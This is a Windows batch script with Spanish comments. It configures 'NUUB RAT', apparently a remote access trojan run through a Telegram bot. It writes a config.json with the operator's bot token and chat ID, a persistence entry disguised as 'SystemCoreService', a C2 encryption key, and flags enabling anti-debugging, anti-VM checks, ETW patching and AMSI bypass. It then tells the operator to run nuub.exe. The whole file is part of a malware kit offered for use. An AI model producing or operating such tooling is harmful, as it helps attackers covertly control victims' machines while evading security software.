@echo off
title NUUB RAT - Quick Config
color 0A

REM ═══════════════════════════════════════════════════════════
REM  USO: quick_config.bat BOT_TOKEN ADMIN_CHAT_ID [PC_ID]
REM  
REM  Ejemplo:
REM    quick_config.bat 123456:ABC-DEF 987654321
REM    quick_config.bat 123456:ABC-DEF 987654321 MI-PC
REM ═══════════════════════════════════════════════════════════

if "%~1"=="" (
    echo.
    echo [ERROR] Falta el BOT TOKEN
    echo.
    echo USO: %~nx0 BOT_TOKEN ADMIN_CHAT_ID [PC_ID]
    echo.
    echo Ejemplo:
    echo   %~nx0 123456:ABC-DEF 987654321
    echo   %~nx0 123456:ABC-DEF 987654321 MI-PC
    echo.
    exit /b 1
)

if "%~2"=="" (
    echo.
    echo [ERROR] Falta el ADMIN CHAT ID
    echo.
    echo USO: %~nx0 BOT_TOKEN ADMIN_CHAT_ID [PC_ID]
    echo.
    exit /b 1
)

set BOT_TOKEN=%~1
set ADMIN_ID=%~2
set PC_ID=%~3
if "%PC_ID%"=="" set PC_ID=PC-001

echo.
echo ══════════════════════════════════════════
echo  NUUB RAT - Configuracion Rapida
echo ══════════════════════════════════════════
echo.
echo  Bot Token:  %BOT_TOKEN:~0,10%...
echo  Admin ID:   %ADMIN_ID%
echo  PC ID:      %PC_ID%
echo.

if exist "config.json" (
    echo [WARNING] config.json ya existe, sera sobreescrito.
    echo.
)

(
echo {
echo     "telegram_bot_token": "%BOT_TOKEN%",
echo     "admin_chat_id": %ADMIN_ID%,
echo     "admin_chat_ids": [%ADMIN_ID%],
echo     "pc_identifier": "%PC_ID%",
echo     "encryption_password": "%RANDOM%%RANDOM%%RANDOM%",
echo     "master_log_filename": "log_master.txt",
echo     "activity_log_filename": "activity_log.csv",
echo     "audit_log_filename": "audit.log",
echo     "auto_start_entry_name": "SystemCoreService",
echo     "log_filename": "nuub.log",
echo     "heartbeat_interval_minutes": 30,
echo     "c2_encryption_key": "",
echo     "stealth_mode": false,
echo     "anti_debug": true,
echo     "anti_vm": true,
echo     "etw_patch": true,
echo     "amsi_bypass": true
echo }
) > config.json

echo [OK] config.json creado correctamente.
echo.
echo Siguiente paso: ejecutar nuub.exe en la misma carpeta.
echo.
